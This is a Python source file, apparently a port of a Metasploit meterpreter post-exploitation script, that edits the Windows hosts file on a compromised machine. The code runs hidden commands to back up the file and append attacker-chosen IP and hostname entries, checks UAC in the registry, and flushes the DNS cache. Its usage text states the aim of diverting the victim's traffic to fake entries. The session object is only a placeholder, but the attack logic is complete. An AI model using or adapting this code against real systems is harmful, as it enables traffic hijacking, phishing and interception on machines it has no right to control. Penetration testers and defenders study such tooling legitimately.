#!/usr/bin/env python3
##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
##

"""
Meterpreter script for modifying the hosts file in windows
given a single entry or several in a file and clear the
DNS cache on the target machine.
This script works with Windows 2000, Windows XP, Windows 2003,
Windows Vista and Windows 2008.
Provided: carlos_perez[at]darkoperator[dot]com
Version: 0.1.0
Note: in Vista UAC must be disabled to be able to perform hosts
file modifications.
"""

import argparse
import os
import random
import re
import sys

# NOTE: This would need actual framework initialization in a real implementation
# Placeholder for Meterpreter session
session = None

HKEY_LOCAL_MACHINE = 0x80000002
KEY_READ = 0x20019


def usage():
    """Display usage information"""
    print("This Meterpreter script is for adding entries in to the Windows Hosts file.")
    print("Since Windows will check first the Hosts file instead of the configured DNS Server")
    print("it will assist in diverting traffic to the fake entry or entries. Either a single")
    print("entry can be provided or a series of entries provided a file with one per line.")
    print()
    print("Example:")
    print()
    print("run hostsedit -e 127.0.0.1,google.com")
    print("run hostsedit -l /tmp/fakednsentries.txt")
    print()


def checkuac(session):
    """Function check if UAC is enabled"""
    winver = session.sys.config.sysinfo
    if re.search(r'Windows 7|Vista', winver["OS"]):
        print("[*] Checking if UAC is enabled.")
        open_key = session.sys.registry.open_key(
            HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
            KEY_READ
        )
        value = open_key.query_value("EnableLUA").data
        if value == 1:
            print("[*] \tUAC is enabled")
            raise Exception("Unable to continue UAC is enabled.")
        else:
            print("[*] \tUAC is disabled")


def add2hosts(session, record, hosts):
    """Function for adding record to hosts file"""
    ip, host = record.split(",")
    print(f"[*] Adding Record for Host {host} with IP {ip}")
    session.sys.process.execute(
        f"cmd /c echo {ip}\t{host} >> {hosts}",
        None,
        {'Hidden': True}
    )


def backuphosts(session, hosts):
    """Make a backup of the hosts file on the target"""
    random_num = f"{random.randint(0, 99999):05d}"
    print("[*] Making Backup of the hosts file.")
    session.sys.process.execute(
        f"cmd /c copy {hosts} {hosts}{random_num}.back",
        None,
        {'Hidden': True}
    )
    print(f"[*] Backup located in {hosts}{random_num}.back")


def cleardnscach(session):
    """Clear DNS Cached entries"""
    print("[*] Clearing the DNS Cache")
    session.sys.process.execute(
        "cmd /c ipconfig /flushdns",
        None,
        {'Hidden': True}
    )


def main():
    parser = argparse.ArgumentParser(
        description="Windows Hosts File Editor Meterpreter Script",
        add_help=False
    )
    parser.add_argument(
        "-e", "--entry",
        help="Host entry in the format of IP,Hostname."
    )
    parser.add_argument(
        "-l", "--list",
        help="Text file with list of entries in the format of IP,Hostname. One per line."
    )
    parser.add_argument(
        "-h", "--help", action="store_true",
        help="Help Options."
    )
    
    args = parser.parse_args()
    
    if args.help or (args.entry is None and args.list is None):
        usage()
        sys.exit(0)
    
    if session is None:
        print("[-] No active session")
        sys.exit(1)
    
    if session.platform != 'windows':
        print("[-] This version of Meterpreter is not supported with this Script!")
        sys.exit(1)
    
    # Set path to the hosts file
    hosts = session.sys.config.getenv('SYSTEMROOT') + "\\System32\\drivers\\etc\\hosts"
    
    if args.entry:
        checkuac(session)
        backuphosts(session, hosts)
        add2hosts(session, args.entry, hosts)
        cleardnscach(session)
    
    elif args.list:
        checkuac(session)
        if not os.path.exists(args.list):
            print(f"[-] File {args.list} does not exist!")
            sys.exit(1)
        else:
            backuphosts(session, hosts)
            with open(args.list, 'r') as f:
                for line in f:
                    line = line.strip()
                    if len(line) < 1:
                        continue
                    if line[0] == "#":
                        continue
                    add2hosts(session, line, hosts)
            cleardnscach(session)


if __name__ == "__main__":
    main()
